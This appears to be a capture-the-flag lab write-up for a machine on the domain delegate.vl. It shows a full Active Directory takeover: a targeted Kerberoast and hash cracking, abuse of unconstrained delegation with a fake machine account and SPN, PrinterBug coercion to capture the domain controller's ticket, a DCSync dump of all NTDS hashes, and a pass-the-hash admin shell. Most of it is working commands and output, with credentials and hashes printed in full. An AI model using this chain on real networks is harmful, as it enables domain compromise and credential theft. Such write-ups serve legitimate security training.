LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
LDAP        10.129.234.69   389    DC1              Resolved collection methods: container, group, acl, localadmin, psremote, trusts, dcom, session, objectprops, rdp
LDAP        10.129.234.69   389    DC1              Done in 0M 17S
LDAP        10.129.234.69   389    DC1              Compressing output into /home/parallels/.nxc/logs/DC1_10.129.234.69_2026-04-26_162722_bloodhound.zip

```

choose the `Shortest paths from Owned objects`\
![Pasted image 20260426163917.png](/ob/Pasted%20image%2020260426163917.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-GenericWrite" >}} This user has one Outbound Object Control, which I’ll select. It’s `GenericWrite` over N.Thompson,With GenericWrite over an account, there are a couple of potential vectors to take over the account. One is a shadow credential, but I wasn’t able to get that to work here. The other is a targeted Kerberoast attack. I’ve shown this attack a couple times before on

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git                                                            
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 17 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.17 KiB | 393.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.
                                                                                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cd  targetedKerberoast                  
                                                                                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ ls                          
kerberoastables.txt  LICENSE  README.md  requirements.txt  targetedKerberoast.py
                                                                                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$  uv add --script targetedKerberoast.py impacket
Resolved 23 packages in 1.33s

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ ./targetedKerberoast.py -d 'delegate.vl' -u A.Briggs -p P4ssw0rd1#123
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$10c9a799364d14b03fa5ef9d041ae27c$724787e3c7cb59fbac1293061248cf8993ef9f4ecafc049a3b44f045bd6977a0b4fca84b80f7c92bb0b7cdb49e15f3a73cc24e0fd2c714e8601af444a242d3ca716be1fd4745179b13351cbc27022fe136c73bf4b1f4e46547d6e32388dc54694aa4507f5c1f71b10ad0b1768b87e6fbc7d9d4175a1ae178bdc32b1cb968bb7e63a3d339e059d07d2ed43ece5377be064cd6620a991f7742797a5cf26acbe4ba528c6c964b1fd40e9dc265067087550054730da8146d46911b8c39e6a7a8b4a733f8714faa6d11929a4d90774bf054c94c6e4a1a0e566111decd5eb35af30edee6eeefd2a3ce8825830650c4beba371ba01cdc25bf0e9d47e0c07d111e21aa37068f67fcb7c742542a1e6c3711b2570fc683fdabdd6b13a62099debd30262a86b2454e3ba834004f5dd43d46673ac8d4e04d62f9dd6a68c49d67cc5be3de6259d68ab9278d804186b88b5766b1edb6ae11386db9b07aca8446ee800060617e59171ff26909d2cebec1080b7df37d6911fe28704cb6b7a0726c164f40a346da42bdb0c4dd2a3a5bf758454edd81f36f2f6cdc061e81a98858f4cc1b696cd85d798b6e8245c51eecd998a66fe1eed792897552e4d9da4cd36cb6a37316cdb9b18b53fc9e7dbb9b2adbfa4b880097f916421a5102538faef3db206d3e9722e0580d94ea3b32f786d53ee386dbab05752b772851b72411250a2937ca8c0134b0c53cd7eb77d8c4b66422c545cedaaa85c2f28f2a2283235b367356f66d7b75ae6c9cdd32bf37166a9ce7ec204da940e953d2ded7e92408b69843e6cf4473302bf6f205ec5208bd355bee1c3a0e882f3fdad803f6729e95615bbdcd2994c6169d29f794dea69abb97564a8603db703280d44f36d5e43367c2e8d0a5e7a5ee83f6458b2bccbebdfb45923703e493570c3e0daaca334a4b9b512e3f28aca322d88e77a8f59f6e97a18c850a7c0d717e2d291a4ffadb576e0ce9cc4f81e1911b02884ef8dfec5494a403103f3c6fbf6133676111c26bd1c007b5bd0c3c550bdaa97f57c79ca0592c25fbdd78e7693a44d592abcbc444565c76e7106d2af74a0f2d763fe12a550b46a7d63653e763ed209e099bfa0e613ad625c6c3ac3868ec74d85d194bbfc47803ddec50656495ab64a94ed63f9bc33b3a3a3f0de806b879f65969f9262e25d3b093d9f626e22ae1a2f5c2cda7867f252b2e8c88175065b00439634cc8f82d6eea4aa47c7993bcaceb6e8169d3ee37d00792685fef3199941d65b164e3142b9e111303724a24c9f22ce057d783e784fc23ee4cc5a443932da13122d938bf3435b22c1a3e1f611b6ad6b6497e6e1d50d33df27b2139de7255edf789a8a3b2db5db2854b7b52a68443cddca955ef04aaee79add422c3365bc9882e4dea199237a9a5f6155192e6564cef036b5a9dd200d7fedfcdc611734684b6026238208831d1c4

```

### Crack

I’ll save that hash to a file and pass it to `hashcat`:

```
$ hashcat N.Thompson.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$1e386cc3c902da2a37ca7fb709f240e7$683a72d4bce12eb20a3bc1345ded9b27c75a471647b1b6c9962a51d4cbbe4230c8f5940e263e36a4cc22ce83e148b2f20a6665bafbd94f26c1c0a27ef81194d1d520bad1a3d5b61688b49f3c8033449f3331c90013992859efcf95425623d37d23d9ddd315657c9cf4322c51ae53b0f458305d3056e2b1d1fa20e859ad89f18a82f0c31d47d7e61182644d02c19a7efff1b2167c801d955e9dd62987a9029f372083c97feffee76ad1b4e11a93f152e7f56037cf6e5dc797a5b73f980856ffad74edeaaa16da87ea7bdfd0c8289714bd3d78964b1c5dbbfcab8a79bb2d797be3935f48130a9e417b9c06db0eaa0101e98030c68e4b4ddc275fb65f903e847fa45ab75343eb49bd5dfc4c480a6b1cbdd1c1bb2aac6fa49f9944d1ddf8c748c1426aff9588f6e93f5290fe1cf502318077d0c6aed0e3fc92a6dea115bf38b793a318481e9ef810b0b4a8ae076884eb81d54f8b3148eeabf927a3ce99012f6c6adf1a03280e066d708d3d8e4174987fbb2b2eccd46f6b3657c5914ef597c24039a726944247ca1c038a09afa3dd0c1ccb74b2d4b869c96640800060fd8e1c60f04401ab6c80af6c8327d991109c4c94680fc67c81eb4584bdac6682151425da4c6613f3f18483e1582f517e75d6ed89e0ee6914231f29e76b1c5826c64f0c26172ffa9b4c5dfb049ca98b7b09af6dbf851a0580e6b86c5d893e9715e1032bab03f1230e4813b15baa6424de688f176d2c6a42fe2977e160b61372389dbe6f695aa5d729d6dd1290fd25a867890ae0fb15eb6c5fe0925aea11bc328ec5156e0f4f53df4aee63958604a0df1c633fb4bfe425924edd726a788acdee4f9d331cdf4410c8c750a6bd541b9e71f3df58ebbdae9b573299f4e782adda09052f60873bc7bc390f41023532045b1d3e92df8d7fa439ee5ec399ae51f065dfcfbf2177ccee8fec0468cc709fcedefe93782ac4139603cf557529095459e12f7096bf2ce36593f092f66a1554c9aae57adeb8d9be701e05c82843cbcc981f56305e83d225e8b5d1f7f007f196db1f82997aea52247a58605d610302b6b28de432303957f72464eefbbb3efe71535104157e340b9869e5545c2624184dc69185922cd523ecbab905c2bd8e0035fa97f3a8ca14f0dbea7f7418e9c8220f697a3532cde2e30ab89e21c5a89868668619491a99ec4c9f5af16218c7b8f30fb86478442c8da1b63d659e6040321eaf5aeaa7423327cc084c8ec90c7ac39604d6a5258f5fbc87449ae9cd6fccb2f5ec834f0656636d12aca7f9c328301d2c9315b29ac932f04c088e4f7093d6e3780fd09763efe7fe9903a2034cdb7dcd0db477d4cfaeba80e3a0fbbe16d881e53fc6501f385a4a2c7c6bf6f81316c74b1dd881137b443235dd32f4d5479ab9f0db5190c55602dc2a3b4b5cee30ea3a861a2b4c7f71fcfb4fab1a4539550b8e97:KALEB_2341
...[snip]...
```

It identifies the hash type and cracks it in about 14 seconds on my host.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ evil-winrm-py -i dc1.delegate.vl -u N.Thompson -p KALEB_2341
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc1.delegate.vl:5985' as 'N.Thompson'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.

```

```
evil-winrm-py PS C:\> tree /f Users
Folder PATH listing
Volume serial number is 0000021E 1753:FC39
C:\USERS
+---Administrator
+---N.Thompson
¦   +---Desktop
¦   ¦       user.txt
¦   ¦       
¦   +---Documents
¦   +---Downloads
¦   +---Favorites
¦   +---Links
¦   +---Music
¦   +---Pictures
¦   +---Saved Games
¦   +---Videos
+---Public

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-SeEnableDelegationPrivilege" >}} I’ve got `SeEnableDelegationPrivilege`, which will allow me to configure both unconstrained and constrained delegation for the machine.Also,the MachineAccountQuota is 10 (the default), which means any user can add up to 10 computers to the domain.I’ll also note that LDAP signing is not enforced. These two prerequisites for abusing unconstrained delegation are met.

{{< /toggle >}}

```
evil-winrm-py PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State  
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```

### Setup Machine

abuse the SeEnableDelegationPrivilege

To abuse this, I’ll create a machine account and a DNS record for it. Then I’ll give it a SPN and set it up for unconstrained delegation. From there, I’ll coerce the DC to authenticate to the fake machine and capture a copy of the TGT which is only saved because of the unconstrained delegation.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ netexec ldap dc1.delegate.vl -u N.Thompson -p 'KALEB_2341' -M maq
LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\N.Thompson:KALEB_2341 
MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
                                                                             
```

I’ll also note that LDAP signing is not enforced. These two prerequisites for abusing unconstrained delegation are met.

I’ll be working with tools from [Impacket](https://github.com/SecureAuthCorp/impacket), [BloodyAD](https://github.com/CravateRouge/bloodyAD), and [krbrelayx](https://github.com/dirkjanm/krbrelayx). I’ll create my machine using `addcomputer.py`:

download the the tool bag

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ git clone  https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 270, done.
remote: Counting objects: 100% (145/145), done.
remote: Compressing objects: 100% (69/69), done.
remote: Total 270 (delta 107), reused 85 (delta 76), pack-reused 125 (from 1)
Receiving objects: 100% (270/270), 112.83 KiB | 1.48 MiB/s, done.
Resolving deltas: 100% (152/152), done.

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ /usr/share/doc/python3-impacket/examples/addcomputer.py  -computer-name test -computer-pass testtest. -dc-ip 

  delegate.vl/N.Thompson:'KALEB_2341'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account test$ with password testtest..
                                                                         
```

Now I can add the DNS record so that objects on the domain can talk to my fake host:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python dnstool.py -u 'delegate.vl\test$' -p 'testtest.' --action add --record test.delegate.vl --data 10.10.16.39  --type A -dns-ip 10.129.234.69  dc1.delegate.vl 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/test.delegate.vl' -t 'test$' -dc-ip 10.129.234.69  dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[!] Could not modify object, the server reports a constrained violation
[!] You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)
[!] To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute

```

It worked. Next I need to assign it an SPN. If I try without the `--additional` flag, it errors out, suggesting I add it:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/test.delegate.vl' -t 'test$' -dc-ip 10.129.234.69  dc1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

And then the original command works too:

Finally I’ll give the host unconstrained delegation using [BloodyAD](https://github.com/CravateRouge/bloodyAD):

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'test$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to test$'s userAccountControl

```

#### Relay

I’ll set up my relay first by running `krbrelayx`. I’ll need to give it the NTLM hash for the computer password I created, “testtest.”. I can calculate that in Python:

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python -c "password = 'testtest.'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
63b024820cef25f4973b7962c9ca3ffb

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python krbrelayx.py -hashes :63b024820cef25f4973b7962c9ca3ffb

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections


```

It seems that it’s vulnerable to all of them. I’ll go with `PrinterBug`:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ netexec smb dc1.delegate.vl -u 'test$' -p testtest. -M coerce_plus 
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\test$:testtest. 
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, MSEven

```

It reports success, and at the relay:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
└─$ netexec smb dc1.delegate.vl -u 'test$' -p testtest. -M coerce_plus -o LISTENER=test.delegate.vl METHOD=PrinterBug          
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\test$:testtest. 
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, spoolss\RpcR
```

The second line says it saved the TGT, and it’s there:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ python krbrelayx.py -hashes :63b024820cef25f4973b7962c9ca3ffb

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'


```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ ls DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache 
'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'

```

With a TGT for the machine account of the DC, I’ll do a DCSync attack to get all the hashes for the domain. I’ll need to set up Kerberos, and I’ll have `netexec` generate the file:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ netexec smb dc1.delegate.vl -u 'test$' -p testtest. --generate-krb5-file krb5.conf
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] krb5 conf saved to: krb5.conf
SMB         10.129.234.69   445    DC1              [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         10.129.234.69   445    DC1              [+] delegate.vl\test$:testtest. 

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache netexec smb dc1.delegate.vl --use-kcache 
SMB         dc1.delegate.vl 445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc1.delegate.vl 445    DC1              [+] DELEGATE.VL\DC1$ from ccache 
                                                                                     
```

### DCSync

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache netexec smb dc1.delegate.vl --use-kcache --ntds
SMB         dc1.delegate.vl 445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc1.delegate.vl 445    DC1              [+] DELEGATE.VL\DC1$ from ccache 
SMB         dc1.delegate.vl 445    DC1              [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         dc1.delegate.vl 445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc1.delegate.vl 445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::                                                                                              
SMB         dc1.delegate.vl 445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      
SMB         dc1.delegate.vl 445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::                                                                                                     
SMB         dc1.delegate.vl 445    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::                                                                                                  
SMB         dc1.delegate.vl 445    DC1              b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::                                                                                                   
SMB         dc1.delegate.vl 445    DC1              R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::                                                                                                  
SMB         dc1.delegate.vl 445    DC1              J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::                                                                                                 
SMB         dc1.delegate.vl 445    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::                                                                                                
SMB         dc1.delegate.vl 445    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::                                                                                                      
SMB         dc1.delegate.vl 445    DC1              test$:4601:aad3b435b51404eeaad3b435b51404ee:63b024820cef25f4973b7962c9ca3ffb:::                                                                                                     
SMB         dc1.delegate.vl 445    DC1              [+] Dumped 10 NTDS hashes to /home/parallels/.nxc/logs/ntds/DC1_dc1.delegate.vl_2026-04-26_231155.ntds of which 8 were added to the database
SMB         dc1.delegate.vl 445    DC1              [*] To extract only enabled accounts from the output file, run the following command:
SMB         dc1.delegate.vl 445    DC1              [*] grep -iv disabled /home/parallels/.nxc/logs/ntds/DC1_dc1.delegate.vl_2026-04-26_231155.ntds | cut -d ':' -f1

```

### Shell

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
└─$ evil-winrm-py -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc1.delegate.vl:5985' as 'administrator'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         8/26/2023   4:22 AM                WindowsPowerShell                                                     
-a----         8/28/2023   3:15 AM             50 a.ps1                                                                 


evil-winrm-py PS C:\Users\Administrator\Documents> cd ..
evil-winrm-py PS C:\Users\Administrator> cd Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> dior
diThe term 'dior' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.                                                                                                                                                  
revil-winrm-py PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         4/26/2026  12:11 AM             34 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> type troot.txt
Cannot find path 'C:\Users\Administrator\Desktop\troot.txt' because it does not exist.
evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
c18251e613e368acff97caef943e158d

```
